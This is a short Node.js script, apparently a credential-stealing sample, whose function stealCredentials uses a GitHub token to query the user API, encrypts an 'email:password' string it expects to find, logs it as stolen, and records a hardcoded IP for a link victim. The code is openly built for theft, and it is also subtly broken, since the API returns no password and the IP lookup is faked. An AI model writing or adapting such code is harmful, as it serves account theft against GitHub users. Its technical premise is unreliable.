const axios = require('axios');
const crypto = require('crypto');
const GITHUB_TOKEN = process.env.GIT_TOKEN;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;

async function stealCredentials() {
  try {
    const response = await axios.get('https://api.github.com/user', {
      headers: { Authorization: `token ${GITHUB_TOKEN}` }
    });

    const userData = response.data;
    // Encrypt stolen credentials
    const iv = crypto.randomBytes(16);
    let encryptedData;
    if (userData.email && userData.password) {
      encryptedData = encrypt(userData.email + ':' + userData.password, ENCRYPTION_KEY, iv);
      console.log('Stolen GitHub Credentials (Encrypted):', encryptedData.toString('hex'));
    } else {
      console.log('Unable to steal credentials. User data incomplete.');
    }

    // Log IP address of the user who clicked on the link
    const ipAddress = getIpAddress();
    console.log('User IP Address:', ipAddress);
  } catch (error) {
    console.error('Error stealing credentials:', error.message);
  }
}

function encrypt(data, key, iv) {
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(key), iv);
  let encrypted = cipher.update(data, 'utf8');
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return encrypted;
}

function getIpAddress() {
  // Simulate getting the IP address of the user who clicked on the link
  return '192.168.0.1';
}
